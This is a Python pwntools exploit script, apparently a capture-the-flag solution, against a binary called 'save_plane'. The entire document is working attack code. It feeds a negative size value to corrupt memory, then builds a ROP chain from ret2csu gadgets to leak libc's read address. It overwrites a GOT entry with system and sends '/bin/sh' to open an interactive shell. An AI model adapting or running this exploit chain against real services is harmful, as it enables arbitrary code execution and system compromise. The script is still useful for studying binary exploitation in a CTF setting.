from pwn import *

pop_rdi   = 0x40156b # pop rdi; ret;
call_puts = 0x401050
read_got = 0x404048
call_main = 0x401255
nop_ret = 0x401016
call_exit = 0x4010E0
exit_got = 0x404070
sleep_got = 0x404078
call_sleep = 0x4010f0

puts_got = 0x404028
libc_csu_init = 0x401562
call_libc_csu_init = 0x401548

call_puts_1 = 0x401278

pop_r12_r14 = 0x401564 # r12, r13, r14, r15
one_gadget = 0xc84da # need r12 == r13 == NULL

if __name__ == "__main__":

	#p = remote( '', )
	p = process( ["./ld-linux-x86-64.so.2", "--library-path", "libs/","./save_plane"] )
	libc = ELF( "./libc.so.6" )

	#gdb.attach( p, '''b *0x401548
	#	b *0x4010e0
	#	continue'''
	#)

	p.recvuntil( ": " )
	p.send( "900000\n" ) # create malloc chunk
	p.recvuntil( ": " )
	p.send( "-4384\n" )
	p.recvuntil( ": " )

	# first payload part 
	payload = p64( nop_ret ) * 8
	payload += p64( pop_rdi )
	payload += p64( read_got )
	payload += p64( call_puts )
	payload += p64( libc_csu_init )

	# second payload part
	payload += p64( 0x0 ) # rbx 
	payload += p64( 0x1 ) # rbp
	payload += p64( 0x0 ) # edi / rdi
	payload += p64( puts_got ) # rsi
	payload += p64( 0x8 ) # edx
	payload += p64( read_got ) # r15
	payload += p64( call_libc_csu_init )
	payload += p64( nop_ret ) * 16

	# third payload part
	payload += p64( pop_r12_r14 )
	payload += p64( 0x0 ) * 4

	
	payload += p64( libc_csu_init )

	# second payload part
	payload += p64( 0x0 ) # rbx 
	payload += p64( 0x1 ) # rbp
	payload += p64( 0x0 ) # edi / rdi
	payload += p64( 0x4040d0 ) # rsi
	payload += p64( 0x8 ) # edx
	payload += p64( read_got ) # r15
	payload += p64( call_libc_csu_init )
	payload += p64( nop_ret ) * 16

	# third payload part
	payload += p64( pop_r12_r14 )
	payload += p64( 0x0 ) * 4
	payload += p64( pop_rdi )
	payload += p64( 0x4040d0 )
	payload += p64( call_puts_1 )

	p.send( payload + '\n' )

	p.recvuntil( "! ************\n" )
	leak = u64( p.recvline().strip().ljust( 8, '\x00' ) ) 
	libc_base = leak - libc.symbols[ 'read' ]
	
	system = leak - 0x18b290

	print "leak: 0x%x" % leak
	print "libc_base: 0x%x" % libc_base
	print "one_shot: 0x%x" % system

	p.send( p64( system ) )
	sleep( 0.5 )
	p.send( "/bin/sh\x00" )

	p.interactive()